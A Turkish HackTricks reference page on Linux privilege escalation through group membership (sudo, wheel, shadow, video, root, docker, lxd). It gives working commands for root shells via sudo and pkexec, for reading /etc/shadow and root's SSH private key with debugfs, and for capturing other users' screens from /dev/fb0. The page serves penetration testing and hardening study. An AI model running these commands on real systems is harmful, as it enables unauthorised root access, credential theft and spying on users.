{{#include ../../banners/hacktricks-training.md}}


# Sudo/Admin Grupları

## **PE - Yöntem 1**

**Bazen**, **varsayılan olarak \(ya da bazı yazılımlar bunu gerektirdiği için\)** **/etc/sudoers** dosyası içinde bu satırlardan bazılarını bulabilirsiniz:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Bu, **sudo veya admin grubuna ait olan herhangi bir kullanıcının sudo olarak her şeyi çalıştırabileceği** anlamına gelir.

Eğer durum böyleyse, **root olmak için sadece şunu çalıştırabilirsiniz**:
```text
sudo su
```
## PE - Yöntem 2

Tüm suid ikili dosyalarını bulun ve **Pkexec** ikili dosyasının olup olmadığını kontrol edin:
```bash
find / -perm -4000 2>/dev/null
```
Eğer pkexec ikili dosyasının SUID ikili dosyası olduğunu ve sudo veya admin grubuna ait olduğunuzu bulursanız, muhtemelen pkexec kullanarak ikili dosyaları sudo olarak çalıştırabilirsiniz. İçeriği kontrol edin:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Orada **pkexec** komutunu çalıştırmaya izin verilen grupları bulacaksınız ve bazı Linux dağıtımlarında **varsayılan olarak** **sudo veya admin** gibi bazı gruplar **görünebilir**.

**Root olmak için şunu çalıştırabilirsiniz**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Eğer **pkexec** komutunu çalıştırmaya çalışırsanız ve bu **hata** ile karşılaşırsanız:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Bu, izinlerinizin olmaması nedeniyle değil, bir GUI olmadan bağlı olmamanızdan kaynaklanıyor**. Bu sorun için bir çözüm burada mevcut: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). **2 farklı ssh oturumuna** ihtiyacınız var:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
# Wheel Grubu

**Bazen**, **varsayılan olarak** **/etc/sudoers** dosyası içinde bu satırı bulabilirsiniz:
```text
%wheel	ALL=(ALL:ALL) ALL
```
Bu, **wheel grubuna ait olan herhangi bir kullanıcının sudo ile her şeyi çalıştırabileceği** anlamına gelir.

Eğer durum böyleyse, **root olmak için sadece şunu çalıştırabilirsiniz**:
```text
sudo su
```
# Shadow Grubu

**shadow** grubundaki kullanıcılar **/etc/shadow** dosyasını **okuyabilir**:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Bu ayrıcalık neredeyse **root erişimi ile eşdeğerdir** çünkü makinenin içindeki tüm verilere erişebilirsiniz.

Dosyalar:`/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Debugfs kullanarak **dosya yazma** işlemi de yapabileceğinizi unutmayın. Örneğin, `/tmp/asd1.txt` dosyasını `/tmp/asd2.txt` dosyasına kopyalamak için şunu yapabilirsiniz:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Ancak, **root tarafından sahip olunan dosyaları yazmaya** çalışırsanız \(örneğin `/etc/shadow` veya `/etc/passwd`\) "**İzin reddedildi**" hatası alırsınız.

# Video Grubu

`w` komutunu kullanarak **sistemde kimin oturum açtığını** bulabilirsiniz ve aşağıdaki gibi bir çıktı gösterecektir:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**, kullanıcının **yossi'nin makinedeki bir terminale fiziksel olarak giriş yaptığını** ifade eder.

**video grubu**, ekran çıktısını görüntüleme erişimine sahiptir. Temelde ekranları gözlemleyebilirsiniz. Bunu yapmak için, ekranın **şu anki görüntüsünü** ham veri olarak almanız ve ekranın kullandığı çözünürlüğü öğrenmeniz gerekir. Ekran verileri `/dev/fb0`'da kaydedilebilir ve bu ekranın çözünürlüğünü `/sys/class/graphics/fb0/virtual_size`'da bulabilirsiniz.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**Ham görüntüyü açmak için** **GIMP**'i kullanabilir, **`screen.raw`** dosyasını seçebilir ve dosya türü olarak **Ham görüntü verisi** seçebilirsiniz:

![](../../images/image%20%28208%29.png)

Sonra Genişlik ve Yüksekliği ekranda kullanılanlarla değiştirin ve farklı Görüntü Türlerini kontrol edin \(ve ekranı daha iyi göstereni seçin\):

![](../../images/image%20%28295%29.png)

# Root Grubu

Görünüşe göre varsayılan olarak **root grubunun üyeleri**, bazı **hizmet** yapılandırma dosyalarını veya bazı **kütüphane** dosyalarını veya ayrıcalıkları artırmak için kullanılabilecek **diğer ilginç şeyleri** **değiştirme** erişimine sahip olabilir...

**Root üyelerinin hangi dosyaları değiştirebileceğini kontrol edin**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker Grubu

Ana makinenin kök dosya sistemini bir örneğin hacmine monte edebilirsiniz, böylece örnek başladığında hemen o hacme `chroot` yükler. Bu, makinede size kök erişimi sağlar.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd Grubu

[lxc - Yetki Yükseltme](lxd-privilege-escalation.md)


{{#include ../../banners/hacktricks-training.md}}
